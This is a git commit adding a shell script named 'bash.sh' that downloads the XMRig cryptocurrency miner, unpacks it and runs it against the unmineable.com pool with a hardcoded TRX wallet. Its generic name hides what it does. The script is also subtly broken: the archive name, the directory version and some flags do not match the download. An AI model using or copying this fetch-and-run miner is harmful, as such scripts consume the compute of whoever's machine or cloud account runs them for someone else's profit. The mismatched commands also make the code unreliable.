ef53b349fef78e3fae09adbd124fbb487e1c3d54
theanaskhxn <100487024+Cryptonictech@users.noreply.github.com>
2022-09-27 15:31:47 +0530

    Create bash.sh

---
+++ bash.sh
@@ -0,0 +1,8 @@
+#!/bin/sh
+wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-static-x64.tar.gz
+
+tar -xf xmrig-6.18.0-linux-x64.tar.gz
+
+cd xmrig-6.14.0
+
+./xmrig -o rx.unmineable.com:3333 -a rx -ku TRX:TBALtaLEiGd2AxJu5wgzxkSHsEgT6WiSyG.Cryptonic-Tech#mtsy-a2u1 -px-cpu 4
